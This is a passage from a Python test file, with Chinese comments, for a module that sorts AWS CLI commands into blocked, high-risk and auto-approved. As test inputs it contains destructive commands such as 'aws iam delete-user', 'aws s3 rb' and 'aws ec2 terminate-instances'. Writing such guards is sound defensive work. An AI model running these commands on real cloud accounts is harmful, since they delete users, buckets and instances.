        assert result['total_pages'] >= 2


# ============================================================================
# Commands 模組測試（補充）
# ============================================================================

class TestCommandsModule:
    """Commands 模組測試"""
    
    def test_is_blocked_iam_delete(self, app_module):
        """IAM 刪除應被封鎖"""
        from commands import is_blocked
        assert is_blocked('aws iam delete-user --user-name test') is True
    
    def test_is_blocked_query_safe(self, app_module):
        """--query 參數中的特殊字元不應觸發封鎖"""
        from commands import is_blocked
        # 這個查詢包含反引號但不應被封鎖
        assert is_blocked("aws ec2 describe-instances --query 'Reservations[*].Instances[*]'") is False
    
    def test_is_dangerous_s3_rb(self, app_module):
        """s3 rb 應是高危"""
        from commands import is_dangerous
        assert is_dangerous('aws s3 rb s3://bucket') is True
    
    def test_is_dangerous_terminate(self, app_module):
        """terminate-instances 應是高危"""
        from commands import is_dangerous
        assert is_dangerous('aws ec2 terminate-instances --instance-ids i-123') is True
    
    def test_is_auto_approve_describe(self, app_module):
        """describe 命令應自動批准"""
        from commands import is_auto_approve
        assert is_auto_approve('aws ec2 describe-instances') is True
        assert is_auto_approve('aws rds describe-db-instances') is True
    
    def test_is_auto_approve_write(self, app_module):
        """寫入命令不應自動批准"""
        from commands import is_auto_approve
        assert is_auto_approve('aws ec2 run-instances') is False
        assert is_auto_approve('aws s3 cp file s3://bucket/') is False


if __name__ == '__main__':
    pytest.main([__file__, '-v'])
